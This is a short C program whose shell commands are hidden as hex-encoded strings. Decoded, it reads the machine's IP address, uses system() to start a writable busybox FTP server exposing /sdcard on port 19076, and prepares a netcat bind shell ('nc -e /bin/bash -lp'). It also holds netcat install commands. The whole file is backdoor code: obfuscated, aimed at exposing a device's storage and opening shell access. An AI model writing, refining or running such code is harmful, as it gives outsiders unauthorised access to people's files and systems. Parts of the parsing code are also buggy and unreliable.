#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
	#define makeFile "\x69\x70\x63\x6f\x6e\x66\x69\x67\x20\x3e\x20\x69\x70\x2e\x74\x78\x74"
#elif __unix__
	#define makeFile "\x69\x66\x63\x6f\x6e\x66\x69\x67\x20\x3e\x20\x69\x70\x2e\x74\x78\x74"
	#define downloadTool "\x61\x70\x74\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x6e\x65\x74\x63\x61\x74"
#else
	#define makeFile "\x69\x70\x20\x2d\x66\x20\x69\x6e\x65\x74\x20\x61\x64\x64\x72\x20\x3e\x20\x69\x70\x2e\x74\x78\x74"
	#define downloadTool "\x70\x6b\x67\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x6e\x65\x74\x63\x61\x74"
#endif

FILE*    createFile();
void     debug();
size_t   lineMake(char*, const char*);
void     ipMake(unsigned char*, const char*);
//void   busyboxTcpsvd(char *, unsigned char*, const char*);
//void   busyboxNc(char*, const char*);

FILE *createFile() {
	system(makeFile);
	return fopen("ip.txt","r");
}


void ipMake(unsigned char *ip, const char *buffer) {
	size_t ipIndex=0;

	for(size_t i=0;i<strlen(buffer);) {
		size_t index=0, j;
		for(j=i;buffer[j] != '\x2e';j++);

		char *temp = (char*)malloc(sizeof(char)*j);

		for(j=i;buffer[i++] != '\x2e';j++)
			temp[index++] = buffer[j];

		ip[ipIndex++] = atoi(temp);
		free(temp);
	}
}

size_t lineMake(char *dest, const char *buffer) {
	static size_t index=0, flag=0;

	for(size_t i=0;i<strlen(buffer);i++) {
		if(buffer[i] == '\x69' && buffer[i+1] == '\x6e' && buffer[i+2] == '\x65' && buffer[i+3] == '\x74') {
			flag++;
			if(flag == 2) {
				for(size_t j=i+5;buffer[j] != '\x2f' && j < i+5+strlen(buffer);j++)
					dest[index++] = buffer[j];
				break;
			}
		}
	}

	//printf("%s\n", dest);
	return flag;
}

void debug() { // debug function
	static size_t count=0;
	printf("debug funtion: %zu\n", count++);
}

int main() {
	//start

	char line[256] = {0}, tmp[256] = {0}, cmd[512] = {0};
	unsigned char ip[4] = {0,0,0,0};
	const char *PORT = "\x31\x39\x30\x37\x36";

	FILE *file = createFile();

	if(file) {
		while(!feof(file)) {
			fgets(line, sizeof(line), file);
			line[strlen(line)-1] = '\0';

			if(lineMake(tmp, line) == 2)
				break;
		}
		fclose(file);
		ipMake(ip, tmp);

	}

	/*busybox tcpsvd */
	snprintf(cmd, sizeof(cmd), "\x62\x75\x73\x79\x62\x6f\x78\x20\x74\x63\x70\x73\x76\x64\x20\x2d\x76\x45\x20\x25\x64\x2e\x25\x64\x2e\x25\x64\x2e\x25\x64\x20\x25\x64\x20\x62\x75\x73\x79\x62\x6f\x78\x20\x66\x74\x70\x64\x20\x2d\x77\x20\x2f\x73\x64\x63\x61\x72\x64",ip[0],ip[1], ip[2],ip[3], atoi(PORT));
	system(cmd);
	/* busybox netcat */
	snprintf(cmd, sizeof(cmd),  "\x6e\x63\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x6c\x70\x20\x25\x64", atoi(PORT));

	return 0;
}
